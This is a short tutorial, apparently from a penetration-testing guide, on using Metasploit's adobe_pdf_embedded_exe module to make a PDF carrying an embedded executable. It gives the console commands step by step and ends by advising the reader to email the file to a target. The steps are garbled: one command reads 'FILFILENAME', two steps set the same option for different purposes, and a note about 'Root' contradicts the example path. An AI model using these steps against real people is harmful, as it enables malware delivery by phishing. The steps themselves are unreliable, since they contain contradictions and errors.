    ## Pdf Attacks using Metasploit

    PDF is a file format. This type of file is widely used and easy to transfer. The
    penetration testing methods introduced earlier are all active implementations
    of penetration testing. If the target host does not monitor the server port, you
    need to use passive penetration testing. At this point, you can try to send a
    virus-containing PDF file to the client to perform passive attacks. The following
    will introduce the creation of PDF files with viruses to achieve passive penetration
    testing attacks.


    ### Use Adobe PDF Embedded EXE module to create PDF virus files

    The specific steps are as follows:


    1. **Use `adobe_pdf_embedded_exe` module.**

    The execution command is as follows:

    ```

    msf> use exploit/windows/fileformat/adobe_pdf_embedded_exe

    msf5 exploit(windows/fileformat/adobe_pdf_embedded_exe)>

    ```


    2. **View the available options of `adobe_pdf_embedded_exe` module.**

    The execution command is as follows:

    ```

    msf exploit(adobe_pdf_embedded_exe)> show options

    ```

    The above information shows all the options available for the `adobe_pdf_embedded_exe`
    module. From the information above, you can see that the default PDF file used
    is `template.pdf`, and the output file is `evil`. If users do not want to use
    the default PDF file, they can specify their own virus file and output name.


    3. **Set the name of the PDF file**

    The execution command is as follows:

    ```

    msf exploit(adobe_pdf_embedded_exe)> set FILENAME test.pdf

    FILENAME => test.pdf

    ```


    4. **Set the `FILENAME` option.**

    In order to use the PDF file, use this option to specify the location of the PDF
    file. If the user does not have a suitable PDF file, the default template `template.pdf`
    can also be used. The execution command is as follows:

    ```

    msf exploit(adobe_pdf_embedded_exe)> set FILFILENAME /root/evil.pdf

    FILENAME => /root/evil.pdf

    ```

    `Note`: The keyword `Root` cannot be included in the PDF file specified here.
    Otherwise, the corresponding PDF file with virus `/root/evil.pdf` cannot be generated.


    5. **Generate PDF virus files.**

    The execution command is as follows:

    ```

    msf exploit(adobe_pdf_embedded_exe)> exploit

    ```

    The output information shows that the `test.pdf` file has been generated and saved
    in the `/root/.msf4/local` directory. Next, the user can send the created `test.pdf`
    to the target host by email or other means.


